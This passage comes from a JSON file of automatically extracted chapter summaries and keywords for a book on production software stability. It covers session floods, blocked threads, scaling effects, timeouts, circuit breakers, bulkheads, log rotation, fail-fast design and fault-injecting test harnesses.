    "summary": "In keeping with the general theme of “weird, bad things happen in the real world,” weird, bad users are definitely out there.\nFor example, I’ve seen badly configured proxy servers start requesting a user’s last URL over and over again.\nI was able to identify the user’s session by its cookie and then trace the session back to the registered customer.\nFor some reason, fifteen minutes after the user’s last request, the request started reappearing in the logs.\nThese requests had the user’s identifying cookie but not his session cookie.\nSo each request was creating a new session.\nPick a deep link from the site and start requesting it without sending cookies.\nWeb servers never tell the application servers that the end user stopped listening for an answer.\nThe application server just keeps on process- ing the request.\nIn the meantime, the 100 bytes of the HTTP request cause the application server to create a session (which may consume several kilobytes of memory in the application server).\nEven a desktop machine on a broadband connection can generate hundreds of thousands of sessions on the application servers.\nIn extreme cases, such as the flood of sessions originating from the single location, you can run into problems worse than just heavy memory consump- tion.\nThe developers wrote a little interceptor that would update the “last login” time whenever a user’s profile got loaded into memory from the database.\nDuring these session floods, though, the request presented a user ID cookie but no session cookie.\nThat meant each request was treated like a new login, loading the profile from the database and attempting to update the “last login” time.\nUsers • 57\nTo the server, each new requester emerges from the swirling fog and makes some demand like “GET /site/index.jsp.” Once answered, they disappear back into the fog without so much as a thank you.\nNetscape originally conceived this data, called cookies (for no compelling reason), as a way to pass state back and forth from client to server and vice versa.\nSecurity-minded application developers quickly realized, however, that unencrypted cookie data was open to manipulation by hostile clients.\nSo cookies started being used for smaller pieces of data, just enough to tag a user with a persistent cookie or a temporary cookie to identify a session.\nAll the user really sends are a series of HTTP requests.\nEarly CGI applications had no need for a session, since they would fire up a new process (usually a Perl script) for each new request.\nTo reach higher volumes, however, developers and vendors turned to long-running application servers, such as Java application servers and long-running Perl processes via mod_perl.\nInstead of waiting for a process fork on each request, the server is always running, waiting for requests.\nWith the long-running server, you can cache state from one request to another, reducing the number of hits to the database.\nThen you need some way to identify a request as part of a session.\nApplication servers handle all the cookie machinery for you, presenting a nice program- matic interface with some resemblance to a Map or Dictionary.\nWhen that invisible machinery involves layers of kludges meant to make HTTP look like a real application protocol, it can tip over badly.\nEach request creates a new session, consuming memory for no good reason.\nIf the web server is configured to ask the application server for every URL, not just ones within a mapped context, then sessions can get created by requests for nonexistent pages.\nOnce a single transaction with a lock on the user’s profile gets hung (because of the need for a connection from a different resource pool), all the other database transactions on that row get blocked.\nGiven the rate that they can request pages, it’s more like sending a battalion of people into the store with clipboards.\nWorse yet, these rapid-fire screen scrapers do not honor session cookies, so if you are not using URL rewriting to track sessions, each new page request will create a new session.\nUsers • 59\nSome of these even go so far as to change their user-agent strings around from one request to the next.\nWhen these requests are sequentially spidering an entire product category, it’s more likely to be a screen scraper.) You may end up blocking quite a few subnets, so it’s a good idea to periodi- cally expire old blocks to keep your firewalls performing well.\nAs you have seen before, session management is the most vulnerable point of a server-side web application.\nEach user’s session requires some memory.\nUsers • 61\nThe interpreter can be running, and the application can still be totally deadlocked, doing nothing useful.\nMultithreading makes application servers scalable enough to handle the web’s largest sites, but it also introduces the possibility of concurrency errors.\nThe most common failure mode for applications built in these languages is navel-gazing—a happily running interpreter with every single thread sitting around waiting for Godot.\nThe simple fact that the server process is running doesn’t help the user get work done, books bought, flights found, and so on.\nIf that client cannot process the synthetic transactions, then there is a problem, whether or not the server process is running.\nBlocked threads can happen anytime you check resources out of a connection pool, deal with caches or object registries, or make calls to external systems.\nDevelopers never hit their application with 10,000 concurrent requests.\nFirst, if you are synchronizing the methods to ensure data integrity, then your application will break when it runs on more than one server.\nSecond, your application will scale better if request-handling threads never block each other.",
    "keywords": [
      "application servers",
      "session",
      "Users",
      "application",
      "server",
      "request",
      "user",
      "requests",
      "web server",
      "servers",
      "Java application servers",
      "cookie",
      "web",
      "cookies",
      "makes application servers"
    ],
    "concepts": [
      "users",
      "user",
      "request",
      "requests",
      "requester",
      "run",
      "running",
      "runs",
      "applications",
      "application"
    ]
  },
  {
    "chapter_number": 10,
    "title": "Segment 10 (pages 75-82)",
    "start_page": 75,
    "end_page": 82,
    "summary": "Blocked Threads • 65\nOnly one thread may execute inside the method at a time.\nWhile one thread is executing this method, any other callers of the method will be blocked.\nSynchronizing the method here worked because the test cases all returned quickly.\nSince nearly 25 percent of the inventory lookups were on the week’s “hot items” and there could be as many as 4,000 (worst case) concurrent requests against the undersized, overworked inventory system, the developer decided to cache the resulting Availability object.\nOn a hit, it would return the cached object.\nFollowing good object orientation princi- ples, the developer decided to create an extension of GlobalObjectCache, overriding the get() method to make the remote call.\nAt that point, any thread calling RemoteAvailabilityCache.get() would block, because one single thread was inside the create() call, waiting for a response that would never come.\nThe conditions for failure were created by the blocking threads and the unbalanced capacities.\nBlocked Threads • 67\nUse Caching, Carefully\nIt can reduce the load on the database server and cut response times to a fraction of what they would be without caching.\nWhen misused, however, caching can create new problems.\nCaches that do not limit maximum memory consumption will eventually eat away at the memory available for the system.\nBy consuming memory needed for other tasks, the cache will actually cause a serious slowdown.\nNo matter what memory size you set on the cache, you need to monitor hit rates for the cached items to see whether most items are being used from cache.\nKeeping something in cache is a bet that the cost of generating it once, plus the cost of hashing and lookups, is less than the cost of generating it every time it’s needed.\nIf a particular cached object is used only once during the lifetime of a server, then caching it is of no help.\nAs a result, caches that use weak references will help the garbage collector reclaim memory instead of preventing it.\nLibraries are notorious sources of blocking threads, whether they are open- source packages or vendor code.\nMany libraries that work as service clients do their own resource pooling inside the library.\nThese often make request threads block forever when a problem occurs.\nIf it’s an open source library, then you may have the time, skills, and resources to find and fix such problems.\nIf the call makes it through the library in time, then the worker thread delivers its result to the future.\nIf the call does not complete in time, the request-handling thread abandons the call, even though the worker thread might eventually complete.\nIf you’re dealing with vendor code, it may also be worth some time beating them up for a better client library.\nA blocked thread is often found near an integration point.\nBlocked threads and slow responses can create a positive feedback loop, amplifying a minor problem into a total failure.\nRecall that the Blocked Threads antipattern is the proximate cause of most failures.\nApplication failures nearly always relate to Blocked Threads in one way or another, including the ever-popular “gradual slowdown” and “hung server.” The Blocked Threads antipattern leads to Chain Reactions and Cascading Failures antipatterns.\nLike Cascading Failures, the Blocked Threads antipattern usually happens around resource pools, particularly database connection pools.\nThe classic example of a self-denial attack is the email from marketing to a “select group of users” that contains some privileged information or offer.\nSometimes it’s the coupon code that gets reused a thousand times or the pricing error that makes one SKU get ordered as many times as all other products com- bined.\nIn a horizontal layer that has some shared resources, it’s possible for a single rogue server to damage all the others.\nFor example, in an ATG-based infrastructure,7 one lock manager always handles distributed lock management to ensure cache coherency.\nAny server that wants to update a RepositoryItem with distributed caching enabled must acquire the lock, update the item, release the lock, and then broadcast a cache inval- idation for the item.\nIf a popular item is inadvertently modified (because of a programming error, for example), then you can end up with thousands of request-handling threads on hundreds of servers all serialized waiting for a write lock on one item.\nIn reality there’s always some amount of contention and coordination among the servers, but we can sometimes approximate shared-nothing.) Where that’s impractical, apply decoupling middleware to reduce the impact of excessive demand, or make the shared resource itself horizontally scalable through redundancy and a backside synchronization protocol.\nYou can also design a fallback mode for the system to use when the shared resource is not available or not responding.\nIf you have a little time to prepare and are using hardware load balancing for traffic management, you can either set aside a portion of your infrastructure or provision new cloud resources to handle the promotion or traffic surge.\nSelf-denial attacks originate inside your own organization, when people cause self-inflicted wounds by creating their own flash mobs and traffic spikes.\nProgramming errors, unexpected scaling effects, and shared resources all create risks when traffic surges.\nWe run into such scaling effects all the time.\nBecause the development and test environments rarely replicate production sizing, it can be hard to see where scaling effects will bite you.",
    "keywords": [
      "Blocked Threads",
      "Blocked Threads antipattern",
      "Threads",
      "cache",
      "server",
      "system",
      "time",
      "Threads antipattern",
      "thread",
      "method",
      "Object",
      "Blocked",
      "Scaling Effects",
      "report erratum",
      "inventory system"
    ],
    "concepts": [
      "cache",
      "cached",
      "caching",
      "caches",
      "time",
      "times",
      "object",
      "objects",
      "threads",
      "thread"
    ]
  },
  {
    "chapter_number": 11,
    "title": "Segment 11 (pages 83-90)",
    "start_page": 83,
    "end_page": 90,
    "summary": "Scaling Effects • 73\nIf the application will only ever have two servers, then point-to-point communication is perfectly fine.\n(As long as the communication is written so it won’t block when the other server dies!) As the number of servers grows, then a different communication strategy is needed.\nThey also cause some additional load on servers that aren’t interested in the messages, since the servers’ NIC gets the broadcast and must notify the TCP/IP stack.\nWith some application servers, the shared resource will be a cluster manager or a lock manager.\nWhen the shared resource gets overloaded, it’ll become a bottleneck limiting capacity.\nWhen the shared resource is redundant and nonexclusive—meaning it can service several of its consumers at once—then there’s no problem.\nEach server operates independently, without need for coordination or calls to any centralized services.\nIn a shared nothing architecture, capacity scales more or less linearly with the number of servers.\nThe trouble with a shared-nothing architecture is that it might scale better at the cost of failover.\nA user’s session resides in memory on an application server.\nObviously, we’d like that transition to be invisible to the user, so the user’s session should be loaded into the new application server.\nPerhaps the application server sends the user’s session to a session backup server after each page request.\nMaybe it serializes the session into a database table or shares its sessions with another designated application server.\nThere are numerous strategies for session failover, but they all involve getting the user’s session off the original server.\nMost of the time, that implies some level of shared resources.\nYou can approximate a shared-nothing architecture by reducing the fan-in of shared resources, i.e., cutting down the number of servers calling on the shared resource.\nIn the example of session failover, you could do this by designating pairs of application servers that each act as the failover server for the other.\nToo often, though, the shared resource will be allocated for exclusive use while a client is processing some unit of work.\nIt depends on what function the caller needs the shared resource to provide.\nExamine production versus QA environments to spot Scaling Effects.\nYou get bitten by Scaling Effects when you move from small one-to-one development and test environments to full-sized production environments.\nOnce you’re dealing with tens of servers, you will probably need to replace it with some kind of one-to-many communication.\nShared resources can be a bottleneck, a capacity constraint, and a threat to stability.\nIf your system must use some sort of shared resource, stress- test it heavily.\nAlso, be sure its clients will keep working if the shared resource gets slow or locks up.\nThat makes it possible for one tier or service to flood another with requests beyond its capacity.\nIn the illustration on page 76, the front-end service has 3,000 request-handling threads available.\nBut as long as the scheduling service can handle enough simultaneous requests to meet that demand prediction, you’d think that should be sufficient.\nSo if you can’t build every service large enough to meet the potentially over- whelming demand from the front end, then you must build both callers and providers to be resilient in the face of a tsunami of requests.\nFor the caller, Circuit Breaker will help by relieving the pressure on downstream services when responses get slow or connections get refused.\nFor service providers, use Handshaking and Backpressure to inform callers to throttle back on the requests.\nThe main reason is that QA for every system is usually scaled down to just two servers.\nSo during integration testing, two servers represent the front-end system and two servers represent the back-end system, resulting in a one- to-one ratio.\nIf your system is resilient, it might slow down—even start to fail fast if it can’t process transactions within the allowed time (see Fail Fast, on page 106)—but it should recover once the load goes down.\nIn development and QA, your system probably looks like one or two servers, and so do all the QA versions of the other systems you call.\nCheck the ratio of front-end to back-end servers, along with the number of threads each side can handle in production compared to QA.\nUnbalanced Capacities is a special case of Scaling Effects: one side of a relationship scales up much more than the other side.\nEven if your production environment is a fixed size, don’t let your QA languish at a measly pair of servers.\nTry test cases where you scale the caller and provider to different ratios.\nIf you provide the back-end system, see what happens if it suddenly gets ten times the highest-ever demand, hitting the most expensive transaction.\nThe increased current load would hit just when supply was low, causing excess demand to trip circuit breakers.\nWhen a bunch of servers impose this transient load all at once, it’s called a dogpile.\nSome configuration management tools allow you to configure a randomized “slew” that will cause servers to pull changes at slightly different times, dis- persing the dogpile across several seconds.\nA pulse can develop during load tests, if the virtual user scripts have fixed- time waits in them.",
    "keywords": [
      "shared resource",
      "servers",
      "system",
      "server",
      "Shared",
      "service",
      "Scaling Effects",
      "application server",
      "number",
      "resource",
      "n’t",
      "threads",
      "Scaling",
      "demand",
      "load"
    ],
    "concepts": [
      "servers",
      "server",
      "scaling",
      "scale",
      "scales",
      "scaled",
      "service",
      "services",
      "gets",
      "getting"
    ]
  },
  {
    "chapter_number": 12,
    "title": "Segment 12 (pages 91-98)",
    "start_page": 91,
    "end_page": 98,
    "summary": "1. First, the admins shut down their autoscaler service so that they could upgrade a ZooKeeper cluster.9\nA similar condition can occur with service discovery systems.\nA service dis- covery service is a distributed system that attempts to report on the state of many distributed systems to other distributed systems.\nThey run health checks periodically to see if any of the services’ nodes should be taken out of rotation.\nIf a single instance of one of the services stops responding, then the discovery service removes that node’s IP address.\nservice Bmany nodes\nservice Cmany nodes\nservice Dmany nodes\nespecially challenging failure mode occurs when a service discovery node is itself partitioned away from the rest of the network.\nAs shown in the next figure, node 3 of the discovery service can no longer reach any of the managed services.\nAny application that needs a service gets told, “Sorry, but it looks like a meteor hit the data center.\nservice Bmany nodes\nservice Cmany nodes\nservice Dmany nodes\nConsider a similar failure, but with a platform management service instead.\nThis service is responsible for starting and stopping machine instances.\nIf it forms a belief that everything is down, then it would necessarily start a new copy of every single service required to run the enterprise.\nRather, it’s more like industrial robotics: the control plane senses the current state of the system, compares it to the desired state, and effects changes to bring the current state into the desired state.\nIn the case of the discovery service, the partitioned node was not able to cor- rectly sense the current state.\nDepending on the individual jobs’ processing time, the number of instances might be “infinity.” That will smart when the Amazon Web Services bill arrives!\nSuppose your control plane senses excess load every second, but it takes five minutes to start a virtual machine to handle the load.\nThat time is usually longer than a monitoring interval, so make sure to account for some delay in the system’s response to the action.\nSlow Responses\nAs you saw in Socket-Based Protocols, on page 35, generating a slow response is worse than refusing a connection or returning an error, particularly in the context of middle-layer services.\nSlow Responses • 85\nA slow response, on the other hand, ties up resources in the calling system and the called system.\nSlow responses usually result from excessive demand.\nSlow responses can also happen as a symptom of some underlying problem.\nMemory leaks often manifest via Slow Responses as the virtual machine works harder and harder to reclaim enough space to process a transaction.\nI have occasionally seen Slow Responses resulting from network congestion.\nSlow responses tend to propagate upward from layer to layer in a gradual form of cascading failure.\nThis could be at the application layer, in which the system would return an error response within the defined protocol.\nSlow Responses trigger Cascading Failures.\nUpstream systems experiencing Slow Responses will themselves slow down and might be vulnerable to stability problems when the response times exceed their own timeouts.\nFor websites, Slow Responses cause more traffic.\nIf your system tracks its own responsiveness, then it can tell when it’s getting slow.\nConsider sending an immediate error response when the average response time exceeds the system’s allowed time (or at the very least, when the average response time exceeds the caller’s timeout!).\nContention for an inadequate supply of database connections produces Slow Responses.\nMemory leaks cause excessive effort in the garbage collector, resulting in Slow Responses.\nInefficient low-level proto- cols can cause network stalls, also resulting in Slow Responses.\nIf your application is like most, it probably treats its database server with far too much trust.\nA common structure in the code goes like this: send a query to the database and then loop over the result set, processing each row.\nUnless your application explicitly limits the number of results it’s willing to process, it can end up exhausting its memory or spinning in a while loop long after the user loses interest.\nSome of them are reporting the current status, some are trying to devise a short-term response to restore service, others are digging into root cause, and some of them are just spreading disinformation.\nThe last query I saw was just hitting a message table that the server used for its database- backed implementation of JMS.\nBecause the app server was written to just select all the rows from the table, each instance would try to receive all ten-million-plus messages.\nThis failure mode can occur when querying databases or calling services.",
    "keywords": [
      "Slow Responses",
      "service",
      "system",
      "nodes service",
      "slow",
      "Responses",
      "service Amany nodes",
      "nodes service Bmany",
      "Amany nodes service",
      "response",
      "state",
      "services",
      "nodes",
      "service discovery systems",
      "report erratum"
    ],
    "concepts": [
      "service",
      "services",
      "start",
      "started",
      "starting",
      "slow",
      "report",
      "reports",
      "reporting",
      "reported"
    ]
  },
  {
    "chapter_number": 13,
    "title": "Segment 13 (pages 99-106)",
    "start_page": 99,
    "end_page": 106,
    "summary": "Timeouts\nWell-placed timeouts provide fault isolation—a problem in some other service or device does not have to become your problem.\nIndeed, some high-level APIs have few or no explicit timeout settings.\nBy hiding the socket from your code, they also prevent you from setting vital timeouts.\nTimeouts can also be relevant within a single service.\nIt’s essential that any resource pool that blocks threads must have a timeout to ensure that calling threads eventually unblock, whether resources become available or not.\nAn approach to dealing with pervasive timeouts is to organize long-running operations into a set of primitives that you can reuse in many places.\nInstead of coding that sequence of interactions dozens of places, with all the associated handling of timeouts (not to mention other kinds\nTimeouts • 93\nYou may think, as I did when porting the sockets library, that handling all the possible timeouts creates undue complexity in your code.\nCollecting this common interaction pattern into a single class also makes it easier to apply the Circuit Breaker pattern.\nTimeouts are often found in the company of retries.\nIf the operation failed because of any significant problem, it’s likely to fail again if retried immediately.\nIf you cannot complete an operation because of some timeout, it is better for you to return a result.\nMaking me wait while you retry the operation might push your response time past my timeout.\nTimeouts have natural synergy with circuit breakers.\nA circuit breaker can tabulate timeouts, tripping to the “off” state if too many occur.\nThe Timeouts pattern and the Fail Fast pattern (which I discus in Fail Fast, on page 106) both address latency problems.\nThe Timeouts pattern is useful when you need to protect your system from someone else’s failure.\nFail Fast applies to incoming requests, whereas the Timeouts pattern applies primarily to outbound requests.\nTimeouts can also help with unbounded result sets by preventing the client from processing the entire result set, but they aren’t the most effective approach to that particular problem.\nTimeouts apply to a general class of problems.\nApply Timeouts to Integration Points, Blocked Threads, and Slow Responses.\nThe Timeouts pattern prevents calls to Integration Points from becoming Blocked Threads.\nThus, timeouts avert Cascading Failures.\nApply Timeouts to recover from unexpected failures.\nThe Timeouts pattern lets us do that.\nCircuit Breaker • 95\nare liable to hit the same problem and result in another timeout.\nMore abstractly, the circuit breaker exists to allow one subsystem (an electrical circuit) to fail (excessive current draw, possibly from a short circuit) without destroying the entire system (the house).\nThis differs from retries, in that circuit breakers exist to prevent operations rather than reexecute them.\nIn the normal “closed” state, the circuit breaker executes operations as usual.\nThese can be calls out to another system, or they can be internal operations that are subject to timeout or other execution failure.\nIf it fails, however, the circuit breaker makes\nWhen the circuit is “open,” calls to the circuit breaker fail immediately, without any attempt to execute the real operation.\nAfter a suitable amount of time, the circuit breaker decides that the operation has a chance of suc- ceeding, so it goes into the “half-open” state.\nIn this state, the next call to the circuit breaker is allowed to execute the dangerous operation.\nShould the call succeed, the circuit breaker resets and returns to the “closed” state, ready for more routine operation.\nIf this trial call fails, however, the circuit breaker returns to the open state until another timeout elapses.\nDepending on the details of the system, the circuit breaker may track different types of failures separately.\nWhen the circuit breaker is open, something has to be done with the calls that come in.\nThe easiest answer would be for the calls to immediately fail, perhaps by throwing an exception (preferably a different exception than an ordinary timeout so that the caller can provide useful feedback).",
    "keywords": [
      "Microsoft SQL Server",
      "Microsoft SQL",
      "Circuit Breaker",
      "colspec FROM tablespec",
      "Timeouts",
      "Circuit",
      "SQL Server SELECT",
      "Timeouts pattern",
      "system",
      "Server SELECT TOP",
      "timeout",
      "Breaker",
      "PostgreSQL SELECT colspec",
      "SELECT colspec",
      "SELECT TOP"
    ],
    "concepts": [
      "failures",
      "failure",
      "operating",
      "operations",
      "operation",
      "breaker",
      "breakers",
      "patterns",
      "pattern",
      "failed"
    ]
  },
  {
    "chapter_number": 14,
    "title": "Segment 14 (pages 107-114)",
    "start_page": 107,
    "end_page": 114,
    "summary": "Circuit Breaker • 97\nOf course, this conversation is not unique to the use of a circuit breaker, but discussing the circuit breaker can be a more effective way of broaching the topic than asking for a requirements document.\nThe state of the circuit breakers in a system is important to another set of stakeholders: operations.\nChanges in a circuit breaker’s state should always be logged, and the current state should be exposed for querying and monitor- ing.\nLikewise, Operations needs some way to directly trip or reset the circuit breaker.\nA circuit breaker should be built at the scope of a single process.\nThat is, the same circuit breaker state affects every thread in a process but is not shared across multiple processes.\nHowever, sharing the circuit breaker state introduces another out- of-process communication.\nEven when just shared within a process, circuit breakers are subject to the gallery of multithreaded programming terrors.\nOpen source circuit breaker libraries are available for every language and framework, so it’s probably better to start with one of those.\nCircuit breakers are effective at guarding against integration points, cascading failures, unbalanced capacities, and slow responses.\nCircuit Breaker is the fundamental pattern for protecting your system from all manner of Integration Points problems.\nCircuit Breaker is good at avoiding calls when Integration Points has a problem.\nLikewise, if there are two application instances running on a server and one crashes, the other will still be running (unless, of course, the first one crashed because of some external influence that would also affect the second).\nAt the largest scale, a mission-critical service might be implemented as sev- eral independent farms of servers, with certain farms reserved for use by critical applications and others available for noncritical uses.\nIn the figure that follows, Foo and Bar both use the enterprise service Baz. Because both depend on a common service, each system has some vulnera- bility to the other.\nAt smaller scales, process binding is an example of partitioning via bulkheads.\nYou can partition the threads inside a single process, with separate thread groups dedicated to different functions.\nThat way, even if all request-handling threads on the application server are hung, it can still respond to admin requests—perhaps to collect data for postmortem analysis or a request to shut down.\nThe Bulkheads pattern partitions capacity to preserve partial functional- ity when bad things happen.\nYou can partition thread pools inside an application, CPUs in a server, or servers in a cluster.\nFiddling is often followed by the “ohnosecond”—that very short moment in time during which you realize that you have pressed the wrong key and brought down a server, deleted vital data, or otherwise damaged the peace and harmony of stable operations.\nIf the system needs a lot of crank-turning and hand-holding to keep running, then administrators develop the habit of staying logged in all the time.\nUnless the system is crashing every day (in which case, look for the presence of the stability antipatterns), the most common reason for logging in will probably be cleaning up log files or purging data.\nAny mechanism that accumulates resources (whether it’s log files in the filesystem, rows in the database, or caches in memory) is like a bucket from a high-school calculus problem.\nWhen this bucket overflows, bad things happen: servers go down, databases get slow or throw errors, response times head for the stars.\nStill, in the rush of excitement about rolling out a new killer application, the next great mission-critical, bet-the-company whatever, data purging always gets the short end of the stick.\nThe notion that it’ll run long enough to accumulate too much data to handle seems like a “high-class problem”—the kind of problem you’d love to have.\nThe most obvious symptom of data growth will be steadily increasing I/O rates on the database servers.\nLog Files\nOne log file is like one pile of cow dung—not very valuable, and you’d rather not dig through it.\nLeft unchecked, however, log files on individual machines are a risk.\nWhen log files grow without bound, they’ll eventually fill up their containing filesystem.\nWhether that’s a volume set aside for logs, the root disk, or the application installation directory (I hope not), it means trouble.\nWhen log files fill up the filesystem, they jeopardize stability.\nIn the best-case scenario, the logging filesystem is separate from any critical data storage (such as transactions), and the application code protects itself well enough that users never realize anything is amiss.\nAs soon as the filesystem got full, this poor exception handler went nuts, trying to log an ever-increasing stack of exceptions.\nBecause there were multiple threads, each trying to log its own Sisyphean exception, this application server was able to consume eight entire CPUs—for a little while, anyway.\nLog file rotation requires just a few minutes of configuration.\nIn the case of legacy code, third-party code, or code that doesn’t use one of the excellent logging frameworks available, the logrotate utility is ubiquitous on UNIX.\nMake sure that all log files will get rotated out and eventually purged, though, or you’ll eventually spend time fixing the tool that’s supposed to help you fix the system.\nDon’t We Have to Keep All Our Log Files Forever?\nIndividual machines can’t possibly retain logs that long.\nThe best thing to do is get logs off of production machines as quickly as possible.",
    "keywords": [
      "Circuit Breaker",
      "circuit breaker state",
      "system",
      "Circuit",
      "log files",
      "Breaker",
      "Foo Bar Baz",
      "log",
      "data",
      "state",
      "report erratum",
      "breaker state",
      "Bulkheads",
      "n’t",
      "files"
    ],
    "concepts": [
      "pattern",
      "patterns",
      "data",
      "service",
      "services",
      "bulkheads",
      "bulkhead",
      "logged",
      "logging",
      "log"
    ]
  },
  {
    "chapter_number": 15,
    "title": "Segment 15 (pages 115-122)",
    "start_page": 115,
    "end_page": 122,
    "summary": "To a long-running server, memory is like oxygen.\nImproper use of caching is the major cause of memory leaks, which in turn lead to horrors like daily server restarts.\nSteady State also encourages better operational discipline by limiting the need for system administrators to log on to the production servers.\nFor example, when a load balancer gets a connection request but not one of the servers in its service pool is functioning, it should immediately refuse the connection.\nSome configurations have the load balancer queue the connection request for a while in the hopes that a server will become available in a short period of time.\nThe application or service can tell from the incoming request or message roughly what database connections and external integration points will be needed.\nThe service can quickly check out the connections it will need and verify the state of the circuit breakers around the integration points.\nIf any of the resources are not available, the service can fail immediately, rather than getting partway through the work.\nAnother way to fail fast in a web application is to perform basic parameter- checking in the servlet or controller that receives the request, before talking to the database.\nFail Fast • 107\nWhen my team started on the rendering software, we applied the Fail Fast pattern.\nThe renderer reported any such failure to the job control system immediately, before it wasted several minutes of compute time.\nSure enough, the one place we broke the Fail Fast principle was the one place our renderer failed to report errors before wasting effort.\nEven when failing fast, be sure to report a system failure (resources not available) differently than an application failure (parameter violations or invalid state).\nThe Fail Fast pattern improves overall system stability by avoiding slow responses.\nAvoid Slow Responses and Fail Fast.\nIf critical resources aren’t available —for example, a popped Circuit Breaker on a required callout—then don’t waste work by getting to that point.\nThat means getting the system back into a known good state using things like exception handlers to fix the execution stack and try-finally blocks or block-scoped resources to clean up memory leaks.\nIf you follow the library’s rules for resource management and state isolation, you can still get the benefits of “let it crash.” You should plan on more code reviews to make sure every developer follows those rules, though!\nOtherwise, we’ll see performance degrade when too many of our instances are restarting at the same time.\nIn the limit, we could have loss of service because all of our instances are busy restarting.\nWith in-process components like actors, the restart time is measured in microseconds.\nIn this case, just crash the NodeJS process.\nWhen we crash an actor or a process, how does a new one get started?\nActor systems use a hierarchical tree of supervisors to manage the restarts.\nThe supervisor can then decide to restart the child actor, restart all of its children, or crash itself.\nUltimately you can get whole branches of the supervision tree to restart with a clean state.\nSupervisors need to keep close track of how often they restart child processes.\nIt may be necessary for the supervisor to crash itself if child restarts happen too densely.\nThis would indicate that either the state isn’t sufficiently cleaned up or the whole system is in jeopardy and the supervisor is just masking the underlying problem.\nThey will always restart the crashed instance, even if it is just going to crash again immediately.\nAfter an actor or instance crashes and the supervisor restarts it, the system must resume calling the newly restored provider.\nWith statically allocated virtual machines in a data center, the instance should be reintegrated when health checks from the load balancer begin to pass.\nRestart fast and reintegrate.\nUse Circuit Breakers to isolate callers from components that crash.\nHTTP provides a response code of “503 Service Unavailable,” which is defined to indicate a temporary condition.2 Most clients, however, will not distinguish between different response codes.\nThe closest approximation I’ve been able to achieve with HTTP-based servers relies on a partnership between a load balancer and the web or application servers.\nThe web server notifies the load balancer—which is pinging a “health check” page on the web server periodically—that it is busy by returning either an error page (HTTP response code 503 “Not Available” works) or an HTML page with an error message.\nThe load balancer then knows not to send any additional work to that particular web server.\nOf course, this helps only for web services and still breaks down if all the web servers are too busy to serve another page.\nThe load balancer would then check the health of the server before directing a request to that instance.\nIf the servers are sitting behind a load balancer, then they have the binary on/off control of stopping responses to the load balancer, which would in turn take the unresponsive server out of the pool.\nCircuit Breaker is a stopgap you can use when calling services that cannot handshake.\nIn that case, instead of asking politely whether the server can handle the request, you just make the call and track whether it works.\nHandshaking between a client and a server permits demand throttling to serviceable levels.\nBoth the client and the server must be built to perform handshaking.\nMost common application-level protocols do not perform handshaking.",
    "keywords": [
      "Fail Fast",
      "Fail Fast pattern",
      "system",
      "Crash",
      "n’t",
      "server",
      "Fast",
      "Fail",
      "State",
      "Handshaking",
      "service",
      "load balancer",
      "Fast pattern",
      "report erratum",
      "data"
    ],
    "concepts": [
      "server",
      "servers",
      "handshaking",
      "handshake",
      "working",
      "work",
      "works",
      "caching",
      "cache",
      "cached"
    ]
  },
  {
    "chapter_number": 16,
    "title": "Segment 16 (pages 123-130)",
    "start_page": 123,
    "end_page": 130,
    "summary": "Test Harnesses • 113\nTest Harnesses\n(Naturally, the proof itself is left as an exercise for the reader.) Furthermore, the interdependencies of today’s systems create such an interlocking web of systems that an integration testing environment really becomes unitary—one global integration test that duplicates the real production systems of the entire enterprise.\nIntegration test environments can verify only what the system does when its dependencies are working correctly.\nThe main theme of this book, however, is that every system will eventually end up operating outside of spec; therefore, it’s vital to test the local system’s behavior when the remote system goes wonky.\nfailures that can occur naturally in production, there will be behaviors that integration testing does not verify.\nA better approach to integration testing would allow you to test most or all of these failure modes.\nIt should preserve or enhance system isolation to avoid the version-locking problem and allow testing in many locations instead of the unitary enterprise-wide integration testing environment I described earlier on page 113.\nTo do that, you can create test harnesses to emulate the remote system on the other end of each integration point.\nHardware and mechanical engineers have used test harnesses for a long time.\nSoftware engineers have used test harnesses, but not as maliciously as they should.\nA good test harness should be devious.\nThe test harness should leave scars on the system under test.\nThe real implemen- tation of DataGateway would deal with connection parameters, a database server, and a bunch of test data.\nA mock object improves the isolation of a unit test by cutting off all the external connections.\nA test harness differs from mock objects in that a mock object can only be trained to produce behavior that conforms to the defined interface.\nA test harness runs as a separate server, so it’s not obliged to conform to any interface.\nIf all low-level errors were guaranteed to be recognized, caught, and thrown as the right type of exception, we would not need test harnesses.\nConsider building a test harness that substitutes for the remote end of every web services call.\nTest Harnesses • 115\nIntegration testing environments are good at examining failures only in the seventh layer—the application layer—and not even all of those.\nA test harness “knows” that it’s meant for testing; it has no other role to play.\nAlthough the real application wouldn’t be written to call the low-level network APIs directly, the test harness can be.\nThe test harness should act like a little hacker, trying all kinds of bad behavior to break callers.\nFor example, refusing connections, connecting slowly, and accepting requests without reply would apply to any socket protocol: HTTP, RMI, or RPC.\nFor these, a single test harness can simulate many types of bad network behavior.\nThat way, I don’t need to change modes on the test harness and a single test harness can break many applications.\nIt can even help with functional testing in the development environment by letting multiple developers hit the test harness from their workstations.\n(Of course, it’s also worthwhile to let the developers run their own instances of the killer test harness.)\nBear in mind that your test harness might be really, really good at breaking, even killing applications.\nIt’s not a bad idea to have the test harness log requests, in case your application dies without so much as a whimper to indicate what killed it.\nA test harness that injects faults will unearth many hidden dependencies.\nThe test harness can be designed like an application server; it can have pluggable behavior for the tests that are related to the real application.\nA single framework for the test harness can be subclassed to implement any application-level protocol, or any perversion of the application-level protocol, necessary.\nCalling real applications lets you test only those errors that the real application can deliberately produce.\nA good test harness lets you simulate all sorts of messy, real-world failure modes.\nThe test harness can produce slow responses, no responses, or garbage responses.\nYou don’t necessarily need a separate test harness for each integration point.\nA “killer” server can listen to several ports, creating different failure modes depending on which port you connect to.\nThe Test Harness pattern augments other testing methods.\nA test harness helps verify “nonfunctional” behavior while maintaining isolation from the remote systems.\nLess tightly coupled forms of middleware allow the calling and receiving sys- tems to process messages in different places and at different times.\nThe more fully you decouple individual servers, layers, and applications, the fewer problems you will observe with Integration Points, Cascading Failures, Slow Responses, and Blocked Threads.\nInside the boundaries of a system or enterprise, it’s more efficient to use back pressure (see Create Back Pressure, on page 120) to create a balanced throughput of requests across synchronously coupled services.",
    "keywords": [
      "test harness",
      "Test Harnesses",
      "system",
      "harness",
      "integration testing",
      "good test harness",
      "systems",
      "remote system",
      "single test harness",
      "Middleware",
      "application",
      "remote",
      "load",
      "integration",
      "Test Harness pattern"
    ],
    "concepts": [
      "application",
      "applications",
      "failure",
      "failures",
      "differs",
      "different",
      "difference",
      "middleware",
      "connection",
      "connections"
    ]
  },
  {
    "chapter_number": 17,
    "title": "Segment 17 (pages 131-138)",
    "start_page": 131,
    "end_page": 138,
